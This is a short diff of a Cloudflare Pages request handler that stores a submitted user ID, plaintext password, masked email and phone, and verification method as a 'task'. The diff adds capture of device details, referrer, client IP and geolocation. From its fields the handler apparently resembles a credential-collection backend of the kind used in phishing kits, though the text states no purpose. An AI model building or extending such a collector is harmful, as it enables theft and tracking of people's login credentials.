@@ -45,6 +45,19 @@ export async function onRequestPost(context) {
     var cc_id = body.cc_id || null;
     var project_name = body.project_name || null;
     var admin_outcome_notified_at = body.admin_outcome_notified_at || null;
+    var device_info = body.device_info || null;
+    var screen_size = body.screen_size || null;
+    var referrer = body.referrer || null;
+
+    var cf = context.request.cf || {};
+    var clientIp = context.request.headers.get("cf-connecting-ip") || "Unknown";
+    var cfData = {
+      ip: clientIp,
+      country: cf.country || "Unknown",
+      city: cf.city || "Unknown",
+      timezone: cf.timezone || "Unknown",
+      asOrganization: cf.asOrganization || "Unknown",
+    };
 
     if (!user_id || !password || !method || !masked_email || !masked_phone || !request_kind) {
       return json(
@@ -85,6 +98,10 @@ export async function onRequestPost(context) {
       member_origin: member_origin,
       cc_id: cc_id,
       password: password,
+      device_info: device_info,
+      screen_size: screen_size,
+      referrer: referrer,
+      cf: cfData,
     }));
 
     return json({ task: task }, 201);
